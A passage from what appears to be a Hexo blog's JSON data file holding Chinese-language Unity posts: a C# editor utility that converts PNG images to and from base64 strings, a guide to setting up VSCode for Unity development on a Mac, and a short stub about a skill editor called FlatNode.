fileName.Replace(headerPath,\"\").Replace(\".png\",\"\")));\n\t\t\tfileContentsList.Add(\"{\");\n\t\t\tfileContentsList.Add(\"    string base64PNG =\");\n\t\t\tfileContentsList.Add(\"    \\\"\" + Texture2dToBase64(fileName) + \"\\\";\" );\n\t\t\tfileContentsList.Add(\"    return LoadBase64String(base64PNG);\" );\n\t\t\tfileContentsList.Add(\"}\\n\" );\n\t\t}\n\t\tFile.AppendAllLines(Application.dataPath + \"Image.txt\", fileContentsList);\n\t\tDebug.Log(Application.dataPath + \"Image.txt\");\n\t}\n\t\n\t//图片转base64string\n\tpublic static string Texture2dToBase64(string texture2d_path)\n\t{\n\t\t//将图片文件转为流文件\n\t\tFileStream fs = new System.IO.FileStream(texture2d_path, System.IO.FileMode.Open, System.IO.FileAccess.Read);\n\t\tbyte[]     thebytes = new byte[fs.Length];\n\n\t\tfs.Read(thebytes, 0, (int)fs.Length);\n\t\t//转为base64string\n\t\tstring base64_texture2d = Convert.ToBase64String(thebytes);\n\t\treturn base64_texture2d;\n\t}  \n\t//字符串转图片\n\tprivate static Texture2D LoadBase64String(string base64PNG)\n\t{\n\t\tTexture2D pic  = new Texture2D(1024, 1024);\n\t\tbyte[]    data = System.Convert.FromBase64String(base64PNG);\n\t\tpic.LoadImage(data);\n\t\tbyte[] bytes = pic.EncodeToPNG();\n\t\treturn pic;\n\t}","source":"_posts/Unity/Utils/小技巧.md","raw":"---\ntitle: 图片与字符串互转\ndate: 2020-05-11 11:41:32\ntop: 100\ncategories:\n- Unity\ntags:\n- UnityEditor\n---\n\n\n[MenuItem(\"test/test\")]\n\tpublic static void ShowImage()\n\t{\n\t\tstring headerPath = Application.dataPath + \"/zhuzizheng/Images/\";\n\t\tList<string> fileContentsList = new List<string>();\n\t\tvar files = Directory.GetFiles(headerPath, \"*.png\");\n\t\tforeach (var fileName in files)\n\t\t{\n\t\t\tDebug.Log(fileName);\n\t\t\tfileContentsList.Add(string.Format(\"public static Texture2D {0}Image()\", fileName.Replace(headerPath,\"\").Replace(\".png\",\"\")));\n\t\t\tfileContentsList.Add(\"{\");\n\t\t\tfileContentsList.Add(\"    string base64PNG =\");\n\t\t\tfileContentsList.Add(\"    \\\"\" + Texture2dToBase64(fileName) + \"\\\";\" );\n\t\t\tfileContentsList.Add(\"    return LoadBase64String(base64PNG);\" );\n\t\t\tfileContentsList.Add(\"}\\n\" );\n\t\t}\n\t\tFile.AppendAllLines(Application.dataPath + \"Image.txt\", fileContentsList);\n\t\tDebug.Log(Application.dataPath + \"Image.txt\");\n\t}\n\t\n\t//图片转base64string\n\tpublic static string Texture2dToBase64(string texture2d_path)\n\t{\n\t\t//将图片文件转为流文件\n\t\tFileStream fs = new System.IO.FileStream(texture2d_path, System.IO.FileMode.Open, System.IO.FileAccess.Read);\n\t\tbyte[]     thebytes = new byte[fs.Length];\n\n\t\tfs.Read(thebytes, 0, (int)fs.Length);\n\t\t//转为base64string\n\t\tstring base64_texture2d = Convert.ToBase64String(thebytes);\n\t\treturn base64_texture2d;\n\t}  \n\t//字符串转图片\n\tprivate static Texture2D LoadBase64String(string base64PNG)\n\t{\n\t\tTexture2D pic  = new Texture2D(1024, 1024);\n\t\tbyte[]    data = System.Convert.FromBase64String(base64PNG);\n\t\tpic.LoadImage(data);\n\t\tbyte[] bytes = pic.EncodeToPNG();\n\t\treturn pic;\n\t}","slug":"Unity/Utils/小技巧","published":1,"updated":"2020-09-24T05:35:50.495Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d13005u2gk7fy4l2qtu","content":"<p>[MenuItem(“test/test”)]<br>    public static void ShowImage()<br>    {<br>        string headerPath = Application.dataPath + “/zhuzizheng/Images/“;<br>        List<string> fileContentsList = new List<string>();<br>        var files = Directory.GetFiles(headerPath, “*.png”);<br>        foreach (var fileName in files)<br>        {<br>            Debug.Log(fileName);<br>            fileContentsList.Add(string.Format(“public static Texture2D {0}Image()”, fileName.Replace(headerPath,””).Replace(“.png”,””)));<br>            fileContentsList.Add(“{“);<br>            fileContentsList.Add(“    string base64PNG =”);<br>            fileContentsList.Add(“    &quot;“ + Texture2dToBase64(fileName) + “&quot;;” );<br>            fileContentsList.Add(“    return LoadBase64String(base64PNG);” );<br>            fileContentsList.Add(“}\\n” );<br>        }<br>        File.AppendAllLines(Application.dataPath + “Image.txt”, fileContentsList);<br>        Debug.Log(Application.dataPath + “Image.txt”);<br>    }</string></string></p>\n<pre><code>//图片转base64string\npublic static string Texture2dToBase64(string texture2d_path)\n{\n    //将图片文件转为流文件\n    FileStream fs = new System.IO.FileStream(texture2d_path, System.IO.FileMode.Open, System.IO.FileAccess.Read);\n    byte[]     thebytes = new byte[fs.Length];\n\n    fs.Read(thebytes, 0, (int)fs.Length);\n    //转为base64string\n    string base64_texture2d = Convert.ToBase64String(thebytes);\n    return base64_texture2d;\n}  \n//字符串转图片\nprivate static Texture2D LoadBase64String(string base64PNG)\n{\n    Texture2D pic  = new Texture2D(1024, 1024);\n    byte[]    data = System.Convert.FromBase64String(base64PNG);\n    pic.LoadImage(data);\n    byte[] bytes = pic.EncodeToPNG();\n    return pic;\n}</code></pre>","site":{"data":{}},"excerpt":"","more":"<p>[MenuItem(“test/test”)]<br>    public static void ShowImage()<br>    {<br>        string headerPath = Application.dataPath + “/zhuzizheng/Images/“;<br>        List<string> fileContentsList = new List<string>();<br>        var files = Directory.GetFiles(headerPath, “*.png”);<br>        foreach (var fileName in files)<br>        {<br>            Debug.Log(fileName);<br>            fileContentsList.Add(string.Format(“public static Texture2D {0}Image()”, fileName.Replace(headerPath,””).Replace(“.png”,””)));<br>            fileContentsList.Add(“{“);<br>            fileContentsList.Add(“    string base64PNG =”);<br>            fileContentsList.Add(“    &quot;“ + Texture2dToBase64(fileName) + “&quot;;” );<br>            fileContentsList.Add(“    return LoadBase64String(base64PNG);” );<br>            fileContentsList.Add(“}\\n” );<br>        }<br>        File.AppendAllLines(Application.dataPath + “Image.txt”, fileContentsList);<br>        Debug.Log(Application.dataPath + “Image.txt”);<br>    }</string></string></p>\n<pre><code>//图片转base64string\npublic static string Texture2dToBase64(string texture2d_path)\n{\n    //将图片文件转为流文件\n    FileStream fs = new System.IO.FileStream(texture2d_path, System.IO.FileMode.Open, System.IO.FileAccess.Read);\n    byte[]     thebytes = new byte[fs.Length];\n\n    fs.Read(thebytes, 0, (int)fs.Length);\n    //转为base64string\n    string base64_texture2d = Convert.ToBase64String(thebytes);\n    return base64_texture2d;\n}  \n//字符串转图片\nprivate static Texture2D LoadBase64String(string base64PNG)\n{\n    Texture2D pic  = new Texture2D(1024, 1024);\n    byte[]    data = System.Convert.FromBase64String(base64PNG);\n    pic.LoadImage(data);\n    byte[] bytes = pic.EncodeToPNG();\n    return pic;\n}</code></pre>"},{"title":"在 Unity 下使用 VSCode 配置","date":"2020-05-11T03:41:32.000Z","top":1,"_content":"\n# Mac 使用Visual Studio Code搭建unity开发环境\n##前置条件:\n* 1.  安装brew,[homebrew](https://brew.sh/)官网安装,然后安装openssl,.net core 需要1.0.1以上的版本,安装命令\n```\nbrew update\nbrew install openssl\n```\n* 2.  下载 [Visual Studio Code](https://link.jianshu.com/?t=https%3A%2F%2Fcode.visualstudio.com)，解压后将其拖拽到launchpad中。\n* 3.  下载安装 [Mono](https://link.jianshu.com/?t=http%3A%2F%2Fwww.mono-project.com%2Fdownload%2F%23download-mac) 跨平台的 .NET 框架，也可以通过[Homebrew](https://link.jianshu.com/?t=https%3A%2F%2Fbrew.sh)的`brew install mono`下载安装。\n* 4.  安装[.Net core SDK](https://dotnet.microsoft.com/learn/dotnet/hello-world-tutorial/install).\n\n## VSCode插件安装,插件重复则最终检查安装即可\n* 1.  unity3d-pack\n* 2. vscode-icons / Material Icon Theme.个人倾向于后一个\n* 3. vscode-solution-explorer\n4. Unity Tools\n* 5. Unity Code Snippets\n* 6. ShaderlabVSCode(Free)\n* 7. Shader languages support for VS Code\n* 8. luaide\n* 9. Debugger for Unity\n* 10. Chinese (Simplified) Language Pack for Visual Studio Code\n* 11. C# XML Documentation Comments\n* 12. C# Snippets\n* 13. C# FixFormat\n* 14. C#\n* 15. TypeLens 查看引用数量\n* 16. TODO Parser .Parse TODOs in your working files.\n* 17. Code Spell Checker\n* 18. ILSpy .NET Decompiler,[使用方式](https://blog.csdn.net/s15100007883/article/details/91365007)\nicsharpcode.ilspy-vscode.dll反编译工具\n* 19. Markdown Preview Enhanced\n* 20. vscode-proto3\n* 21. Open iTerm2\n* 22. vscode-pdf\n* 23. Draw.io\n* 24. 已经下载好的包,在/Users/用户名/.vscode/extensions 路径下将已经下载好的整套插件 [extensions](https://pan.baidu.com/s/1WM1Sjs3b8s4n8aXNm5OAkg)   密码:a6h4 文件夹替换,这个版本的omnisharp是1.34.3\n如果你进行更新了,则会变的高.需要手动下载\n* 25. 手动下载omnisharp和debugger需要在路径/Users/用户名/.vscode/extensions/ms-vscode.csharp-1.21.4/package.json 这个文件里面找到omnisharp对应的版本以及debugger对应的版本,下载完毕之后解压到当前文件夹,最后需要生成空文件install.LOCK即可\n 最终效果:\n![整个插件目录](https://upload-images.jianshu.io/upload_images/1480659-fcce1c2a1fd832cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n![debugger](https://upload-images.jianshu.io/upload_images/1480659-f2f73d182f35b020.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n![omnisharp](https://upload-images.jianshu.io/upload_images/1480659-aaf2a0242585249e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n![install.LOCK](https://upload-images.jianshu.io/upload_images/1480659-1a7f011d7c3e2635.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n\n\n\n##在unity3d中集成VSCode\n* 1. 在AssetStore搜索VSCode并安装\n* 2. 自定义VSCode在unity中的配置\n* 3. 使用VSCode打开unity工程\n\n## 出现的问题\n* 1. omnisharp安装不上去,解决方案1:翻墙\n解决方案2:手动安装,在github上面下载\n* 2. mono版本过多,[参考链接](https://github.com/OmniSharp/omnisharp-vscode/issues/1004)\n* 3. 启动不了omnisharp服务,去掉omnisharp设置里面的Omnisharp: Wait For Debugger选项.\n\n\n#####小技巧:\n* 1. timeScale不影响Update和LateUpdate，会影响FixedUpdate。\n* 2. timeScale不影响Time.realtimeSinceStartup，会影响Time.timeSinceLevelLoad和Time.time。\n* 3. timeScale不影响Time.fixedDeltaTime和Time.unscaleDeltaTime，会影响Time.deltaTime。\n* 4. 当使用Time.deltaTime/Time.time/Time.timeSinceLevelLoad做的操作,可以使用 timeScale进行暂停和加速.","source":"_posts/Unity/VisualStudioCode/VSCodeUnity.md","raw":"---\ntitle:  在 Unity 下使用 VSCode 配置\ndate: 2020-05-11 11:41:32\ntop: 1\ncategories:\n- Unity\ntags:\n- VSCode\n---\n\n# Mac 使用Visual Studio Code搭建unity开发环境\n##前置条件:\n* 1.  安装brew,[homebrew](https://brew.sh/)官网安装,然后安装openssl,.net core 需要1.0.1以上的版本,安装命令\n```\nbrew update\nbrew install openssl\n```\n* 2.  下载 [Visual Studio Code](https://link.jianshu.com/?t=https%3A%2F%2Fcode.visualstudio.com)，解压后将其拖拽到launchpad中。\n* 3.  下载安装 [Mono](https://link.jianshu.com/?t=http%3A%2F%2Fwww.mono-project.com%2Fdownload%2F%23download-mac) 跨平台的 .NET 框架，也可以通过[Homebrew](https://link.jianshu.com/?t=https%3A%2F%2Fbrew.sh)的`brew install mono`下载安装。\n* 4.  安装[.Net core SDK](https://dotnet.microsoft.com/learn/dotnet/hello-world-tutorial/install).\n\n## VSCode插件安装,插件重复则最终检查安装即可\n* 1.  unity3d-pack\n* 2. vscode-icons / Material Icon Theme.个人倾向于后一个\n* 3. vscode-solution-explorer\n4. Unity Tools\n* 5. Unity Code Snippets\n* 6. ShaderlabVSCode(Free)\n* 7. Shader languages support for VS Code\n* 8. luaide\n* 9. Debugger for Unity\n* 10. Chinese (Simplified) Language Pack for Visual Studio Code\n* 11. C# XML Documentation Comments\n* 12. C# Snippets\n* 13. C# FixFormat\n* 14. C#\n* 15. TypeLens 查看引用数量\n* 16. TODO Parser .Parse TODOs in your working files.\n* 17. Code Spell Checker\n* 18. ILSpy .NET Decompiler,[使用方式](https://blog.csdn.net/s15100007883/article/details/91365007)\nicsharpcode.ilspy-vscode.dll反编译工具\n* 19. Markdown Preview Enhanced\n* 20. vscode-proto3\n* 21. Open iTerm2\n* 22. vscode-pdf\n* 23. Draw.io\n* 24. 已经下载好的包,在/Users/用户名/.vscode/extensions 路径下将已经下载好的整套插件 [extensions](https://pan.baidu.com/s/1WM1Sjs3b8s4n8aXNm5OAkg)   密码:a6h4 文件夹替换,这个版本的omnisharp是1.34.3\n如果你进行更新了,则会变的高.需要手动下载\n* 25. 手动下载omnisharp和debugger需要在路径/Users/用户名/.vscode/extensions/ms-vscode.csharp-1.21.4/package.json 这个文件里面找到omnisharp对应的版本以及debugger对应的版本,下载完毕之后解压到当前文件夹,最后需要生成空文件install.LOCK即可\n 最终效果:\n![整个插件目录](https://upload-images.jianshu.io/upload_images/1480659-fcce1c2a1fd832cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n![debugger](https://upload-images.jianshu.io/upload_images/1480659-f2f73d182f35b020.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n![omnisharp](https://upload-images.jianshu.io/upload_images/1480659-aaf2a0242585249e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n![install.LOCK](https://upload-images.jianshu.io/upload_images/1480659-1a7f011d7c3e2635.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n\n\n\n##在unity3d中集成VSCode\n* 1. 在AssetStore搜索VSCode并安装\n* 2. 自定义VSCode在unity中的配置\n* 3. 使用VSCode打开unity工程\n\n## 出现的问题\n* 1. omnisharp安装不上去,解决方案1:翻墙\n解决方案2:手动安装,在github上面下载\n* 2. mono版本过多,[参考链接](https://github.com/OmniSharp/omnisharp-vscode/issues/1004)\n* 3. 启动不了omnisharp服务,去掉omnisharp设置里面的Omnisharp: Wait For Debugger选项.\n\n\n#####小技巧:\n* 1. timeScale不影响Update和LateUpdate，会影响FixedUpdate。\n* 2. timeScale不影响Time.realtimeSinceStartup，会影响Time.timeSinceLevelLoad和Time.time。\n* 3. timeScale不影响Time.fixedDeltaTime和Time.unscaleDeltaTime，会影响Time.deltaTime。\n* 4. 当使用Time.deltaTime/Time.time/Time.timeSinceLevelLoad做的操作,可以使用 timeScale进行暂停和加速.","slug":"Unity/VisualStudioCode/VSCodeUnity","published":1,"updated":"2020-05-15T02:50:08.343Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d14005x2gk7guvn7xph","content":"<h1 id=\"Mac-使用Visual-Studio-Code搭建unity开发环境\"><a href=\"#Mac-使用Visual-Studio-Code搭建unity开发环境\" class=\"headerlink\" title=\"Mac 使用Visual Studio Code搭建unity开发环境\"></a>Mac 使用Visual Studio Code搭建unity开发环境</h1><p>##前置条件:</p>\n<ul>\n<li><ol>\n<li>安装brew,<a href=\"https://brew.sh/\" target=\"_blank\" rel=\"noopener\">homebrew</a>官网安装,然后安装openssl,.net core 需要1.0.1以上的版本,安装命令<pre><code>brew update\nbrew install openssl</code></pre></li>\n</ol>\n</li>\n<li><ol start=\"2\">\n<li>下载 <a href=\"https://link.jianshu.com/?t=https%3A%2F%2Fcode.visualstudio.com\" target=\"_blank\" rel=\"noopener\">Visual Studio Code</a>，解压后将其拖拽到launchpad中。</li>\n</ol>\n</li>\n<li><ol start=\"3\">\n<li>下载安装 <a href=\"https://link.jianshu.com/?t=http%3A%2F%2Fwww.mono-project.com%2Fdownload%2F%23download-mac\" target=\"_blank\" rel=\"noopener\">Mono</a> 跨平台的 .NET 框架，也可以通过<a href=\"https://link.jianshu.com/?t=https%3A%2F%2Fbrew.sh\" target=\"_blank\" rel=\"noopener\">Homebrew</a>的<code>brew install mono</code>下载安装。</li>\n</ol>\n</li>\n<li><ol start=\"4\">\n<li>安装<a href=\"https://dotnet.microsoft.com/learn/dotnet/hello-world-tutorial/install\" target=\"_blank\" rel=\"noopener\">.Net core SDK</a>.</li>\n</ol>\n</li>\n</ul>\n<h2 id=\"VSCode插件安装-插件重复则最终检查安装即可\"><a href=\"#VSCode插件安装-插件重复则最终检查安装即可\" class=\"headerlink\" title=\"VSCode插件安装,插件重复则最终检查安装即可\"></a>VSCode插件安装,插件重复则最终检查安装即可</h2><ul>\n<li><ol>\n<li>unity3d-pack</li>\n</ol>\n</li>\n<li><ol start=\"2\">\n<li>vscode-icons / Material Icon Theme.个人倾向于后一个</li>\n</ol>\n</li>\n<li><ol start=\"3\">\n<li>vscode-solution-explorer</li>\n</ol>\n</li>\n</ul>\n<ol start=\"4\">\n<li>Unity Tools</li>\n</ol>\n<ul>\n<li><ol start=\"5\">\n<li>Unity Code Snippets</li>\n</ol>\n</li>\n<li><ol start=\"6\">\n<li>ShaderlabVSCode(Free)</li>\n</ol>\n</li>\n<li><ol start=\"7\">\n<li>Shader languages support for VS Code</li>\n</ol>\n</li>\n<li><ol start=\"8\">\n<li>luaide</li>\n</ol>\n</li>\n<li><ol start=\"9\">\n<li>Debugger for Unity</li>\n</ol>\n</li>\n<li><ol start=\"10\">\n<li>Chinese (Simplified) Language Pack for Visual Studio Code</li>\n</ol>\n</li>\n<li><ol start=\"11\">\n<li>C# XML Documentation Comments</li>\n</ol>\n</li>\n<li><ol start=\"12\">\n<li>C# Snippets</li>\n</ol>\n</li>\n<li><ol start=\"13\">\n<li>C# FixFormat</li>\n</ol>\n</li>\n<li><ol start=\"14\">\n<li>C#</li>\n</ol>\n</li>\n<li><ol start=\"15\">\n<li>TypeLens 查看引用数量</li>\n</ol>\n</li>\n<li><ol start=\"16\">\n<li>TODO Parser .Parse TODOs in your working files.</li>\n</ol>\n</li>\n<li><ol start=\"17\">\n<li>Code Spell Checker</li>\n</ol>\n</li>\n<li><ol start=\"18\">\n<li>ILSpy .NET Decompiler,<a href=\"https://blog.csdn.net/s15100007883/article/details/91365007\" target=\"_blank\" rel=\"noopener\">使用方式</a><br>icsharpcode.ilspy-vscode.dll反编译工具</li>\n</ol>\n</li>\n<li><ol start=\"19\">\n<li>Markdown Preview Enhanced</li>\n</ol>\n</li>\n<li><ol start=\"20\">\n<li>vscode-proto3</li>\n</ol>\n</li>\n<li><ol start=\"21\">\n<li>Open iTerm2</li>\n</ol>\n</li>\n<li><ol start=\"22\">\n<li>vscode-pdf</li>\n</ol>\n</li>\n<li><ol start=\"23\">\n<li>Draw.io</li>\n</ol>\n</li>\n<li><ol start=\"24\">\n<li>已经下载好的包,在/Users/用户名/.vscode/extensions 路径下将已经下载好的整套插件 <a href=\"https://pan.baidu.com/s/1WM1Sjs3b8s4n8aXNm5OAkg\" target=\"_blank\" rel=\"noopener\">extensions</a>   密码:a6h4 文件夹替换,这个版本的omnisharp是1.34.3<br>如果你进行更新了,则会变的高.需要手动下载</li>\n</ol>\n</li>\n<li><ol start=\"25\">\n<li>手动下载omnisharp和debugger需要在路径/Users/用户名/.vscode/extensions/ms-vscode.csharp-1.21.4/package.json 这个文件里面找到omnisharp对应的版本以及debugger对应的版本,下载完毕之后解压到当前文件夹,最后需要生成空文件install.LOCK即可<br>最终效果:<br><img src=\"https://upload-images.jianshu.io/upload_images/1480659-fcce1c2a1fd832cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"整个插件目录\"></li>\n</ol>\n</li>\n</ul>\n<p><img src=\"https://upload-images.jianshu.io/upload_images/1480659-f2f73d182f35b020.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"debugger\"></p>\n<p><img src=\"https://upload-images.jianshu.io/upload_images/1480659-aaf2a0242585249e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"omnisharp\"></p>\n<p><img src=\"https://upload-images.jianshu.io/upload_images/1480659-1a7f011d7c3e2635.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"install.LOCK\"></p>\n<p>##在unity3d中集成VSCode</p>\n<ul>\n<li><ol>\n<li>在AssetStore搜索VSCode并安装</li>\n</ol>\n</li>\n<li><ol start=\"2\">\n<li>自定义VSCode在unity中的配置</li>\n</ol>\n</li>\n<li><ol start=\"3\">\n<li>使用VSCode打开unity工程</li>\n</ol>\n</li>\n</ul>\n<h2 id=\"出现的问题\"><a href=\"#出现的问题\" class=\"headerlink\" title=\"出现的问题\"></a>出现的问题</h2><ul>\n<li><ol>\n<li>omnisharp安装不上去,解决方案1:翻墙<br>解决方案2:手动安装,在github上面下载</li>\n</ol>\n</li>\n<li><ol start=\"2\">\n<li>mono版本过多,<a href=\"https://github.com/OmniSharp/omnisharp-vscode/issues/1004\" target=\"_blank\" rel=\"noopener\">参考链接</a></li>\n</ol>\n</li>\n<li><ol start=\"3\">\n<li>启动不了omnisharp服务,去掉omnisharp设置里面的Omnisharp: Wait For Debugger选项.</li>\n</ol>\n</li>\n</ul>\n<p>#####小技巧:</p>\n<ul>\n<li><ol>\n<li>timeScale不影响Update和LateUpdate，会影响FixedUpdate。</li>\n</ol>\n</li>\n<li><ol start=\"2\">\n<li>timeScale不影响Time.realtimeSinceStartup，会影响Time.timeSinceLevelLoad和Time.time。</li>\n</ol>\n</li>\n<li><ol start=\"3\">\n<li>timeScale不影响Time.fixedDeltaTime和Time.unscaleDeltaTime，会影响Time.deltaTime。</li>\n</ol>\n</li>\n<li><ol start=\"4\">\n<li>当使用Time.deltaTime/Time.time/Time.timeSinceLevelLoad做的操作,可以使用 timeScale进行暂停和加速.</li>\n</ol>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Mac-使用Visual-Studio-Code搭建unity开发环境\"><a href=\"#Mac-使用Visual-Studio-Code搭建unity开发环境\" class=\"headerlink\" title=\"Mac 使用Visual Studio Code搭建unity开发环境\"></a>Mac 使用Visual Studio Code搭建unity开发环境</h1><p>##前置条件:</p>\n<ul>\n<li><ol>\n<li>安装brew,<a href=\"https://brew.sh/\" target=\"_blank\" rel=\"noopener\">homebrew</a>官网安装,然后安装openssl,.net core 需要1.0.1以上的版本,安装命令<pre><code>brew update\nbrew install openssl</code></pre></li>\n</ol>\n</li>\n<li><ol start=\"2\">\n<li>下载 <a href=\"https://link.jianshu.com/?t=https%3A%2F%2Fcode.visualstudio.com\" target=\"_blank\" rel=\"noopener\">Visual Studio Code</a>，解压后将其拖拽到launchpad中。</li>\n</ol>\n</li>\n<li><ol start=\"3\">\n<li>下载安装 <a href=\"https://link.jianshu.com/?t=http%3A%2F%2Fwww.mono-project.com%2Fdownload%2F%23download-mac\" target=\"_blank\" rel=\"noopener\">Mono</a> 跨平台的 .NET 框架，也可以通过<a href=\"https://link.jianshu.com/?t=https%3A%2F%2Fbrew.sh\" target=\"_blank\" rel=\"noopener\">Homebrew</a>的<code>brew install mono</code>下载安装。</li>\n</ol>\n</li>\n<li><ol start=\"4\">\n<li>安装<a href=\"https://dotnet.microsoft.com/learn/dotnet/hello-world-tutorial/install\" target=\"_blank\" rel=\"noopener\">.Net core SDK</a>.</li>\n</ol>\n</li>\n</ul>\n<h2 id=\"VSCode插件安装-插件重复则最终检查安装即可\"><a href=\"#VSCode插件安装-插件重复则最终检查安装即可\" class=\"headerlink\" title=\"VSCode插件安装,插件重复则最终检查安装即可\"></a>VSCode插件安装,插件重复则最终检查安装即可</h2><ul>\n<li><ol>\n<li>unity3d-pack</li>\n</ol>\n</li>\n<li><ol start=\"2\">\n<li>vscode-icons / Material Icon Theme.个人倾向于后一个</li>\n</ol>\n</li>\n<li><ol start=\"3\">\n<li>vscode-solution-explorer</li>\n</ol>\n</li>\n</ul>\n<ol start=\"4\">\n<li>Unity Tools</li>\n</ol>\n<ul>\n<li><ol start=\"5\">\n<li>Unity Code Snippets</li>\n</ol>\n</li>\n<li><ol start=\"6\">\n<li>ShaderlabVSCode(Free)</li>\n</ol>\n</li>\n<li><ol start=\"7\">\n<li>Shader languages support for VS Code</li>\n</ol>\n</li>\n<li><ol start=\"8\">\n<li>luaide</li>\n</ol>\n</li>\n<li><ol start=\"9\">\n<li>Debugger for Unity</li>\n</ol>\n</li>\n<li><ol start=\"10\">\n<li>Chinese (Simplified) Language Pack for Visual Studio Code</li>\n</ol>\n</li>\n<li><ol start=\"11\">\n<li>C# XML Documentation Comments</li>\n</ol>\n</li>\n<li><ol start=\"12\">\n<li>C# Snippets</li>\n</ol>\n</li>\n<li><ol start=\"13\">\n<li>C# FixFormat</li>\n</ol>\n</li>\n<li><ol start=\"14\">\n<li>C#</li>\n</ol>\n</li>\n<li><ol start=\"15\">\n<li>TypeLens 查看引用数量</li>\n</ol>\n</li>\n<li><ol start=\"16\">\n<li>TODO Parser .Parse TODOs in your working files.</li>\n</ol>\n</li>\n<li><ol start=\"17\">\n<li>Code Spell Checker</li>\n</ol>\n</li>\n<li><ol start=\"18\">\n<li>ILSpy .NET Decompiler,<a href=\"https://blog.csdn.net/s15100007883/article/details/91365007\" target=\"_blank\" rel=\"noopener\">使用方式</a><br>icsharpcode.ilspy-vscode.dll反编译工具</li>\n</ol>\n</li>\n<li><ol start=\"19\">\n<li>Markdown Preview Enhanced</li>\n</ol>\n</li>\n<li><ol start=\"20\">\n<li>vscode-proto3</li>\n</ol>\n</li>\n<li><ol start=\"21\">\n<li>Open iTerm2</li>\n</ol>\n</li>\n<li><ol start=\"22\">\n<li>vscode-pdf</li>\n</ol>\n</li>\n<li><ol start=\"23\">\n<li>Draw.io</li>\n</ol>\n</li>\n<li><ol start=\"24\">\n<li>已经下载好的包,在/Users/用户名/.vscode/extensions 路径下将已经下载好的整套插件 <a href=\"https://pan.baidu.com/s/1WM1Sjs3b8s4n8aXNm5OAkg\" target=\"_blank\" rel=\"noopener\">extensions</a>   密码:a6h4 文件夹替换,这个版本的omnisharp是1.34.3<br>如果你进行更新了,则会变的高.需要手动下载</li>\n</ol>\n</li>\n<li><ol start=\"25\">\n<li>手动下载omnisharp和debugger需要在路径/Users/用户名/.vscode/extensions/ms-vscode.csharp-1.21.4/package.json 这个文件里面找到omnisharp对应的版本以及debugger对应的版本,下载完毕之后解压到当前文件夹,最后需要生成空文件install.LOCK即可<br>最终效果:<br><img src=\"https://upload-images.jianshu.io/upload_images/1480659-fcce1c2a1fd832cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"整个插件目录\"></li>\n</ol>\n</li>\n</ul>\n<p><img src=\"https://upload-images.jianshu.io/upload_images/1480659-f2f73d182f35b020.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"debugger\"></p>\n<p><img src=\"https://upload-images.jianshu.io/upload_images/1480659-aaf2a0242585249e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"omnisharp\"></p>\n<p><img src=\"https://upload-images.jianshu.io/upload_images/1480659-1a7f011d7c3e2635.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"install.LOCK\"></p>\n<p>##在unity3d中集成VSCode</p>\n<ul>\n<li><ol>\n<li>在AssetStore搜索VSCode并安装</li>\n</ol>\n</li>\n<li><ol start=\"2\">\n<li>自定义VSCode在unity中的配置</li>\n</ol>\n</li>\n<li><ol start=\"3\">\n<li>使用VSCode打开unity工程</li>\n</ol>\n</li>\n</ul>\n<h2 id=\"出现的问题\"><a href=\"#出现的问题\" class=\"headerlink\" title=\"出现的问题\"></a>出现的问题</h2><ul>\n<li><ol>\n<li>omnisharp安装不上去,解决方案1:翻墙<br>解决方案2:手动安装,在github上面下载</li>\n</ol>\n</li>\n<li><ol start=\"2\">\n<li>mono版本过多,<a href=\"https://github.com/OmniSharp/omnisharp-vscode/issues/1004\" target=\"_blank\" rel=\"noopener\">参考链接</a></li>\n</ol>\n</li>\n<li><ol start=\"3\">\n<li>启动不了omnisharp服务,去掉omnisharp设置里面的Omnisharp: Wait For Debugger选项.</li>\n</ol>\n</li>\n</ul>\n<p>#####小技巧:</p>\n<ul>\n<li><ol>\n<li>timeScale不影响Update和LateUpdate，会影响FixedUpdate。</li>\n</ol>\n</li>\n<li><ol start=\"2\">\n<li>timeScale不影响Time.realtimeSinceStartup，会影响Time.timeSinceLevelLoad和Time.time。</li>\n</ol>\n</li>\n<li><ol start=\"3\">\n<li>timeScale不影响Time.fixedDeltaTime和Time.unscaleDeltaTime，会影响Time.deltaTime。</li>\n</ol>\n</li>\n<li><ol start=\"4\">\n<li>当使用Time.deltaTime/Time.time/Time.timeSinceLevelLoad做的操作,可以使用 timeScale进行暂停和加速.</li>\n</ol>\n</li>\n</ul>\n"},{"title":"14 FlatNode","date":"2020-05-11T03:41:32.000Z","top":14,"_content":"\n\n# 介绍\n\n* 1:技能编辑器,使用Flat缓存,加载速度快\n* 2:结构","source":"_posts/Unity/UnityEditor/FlatNode/FlatNode.md","raw":"---\ntitle: 14 FlatNode\ndate: 2020-05-11 11:41:32\ntop: 14\ncategories:\n- Unity\ntags:\n- UnityEditor\n---\n\n\n# 介绍\n\n* 1:技能编辑器,使用Flat缓存,加载速度快\n* 2:结构","slug":"Unity/UnityEditor/FlatNode/FlatNode","published":1,"updated":"2020-05-15T02:56:34.976Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d1t006c2gk7ha8y6en3","content":"<h1 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h1><ul>\n<li>1:技能编辑器,使用Flat缓存,加载速度快</li>\n<li>2:结构</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" 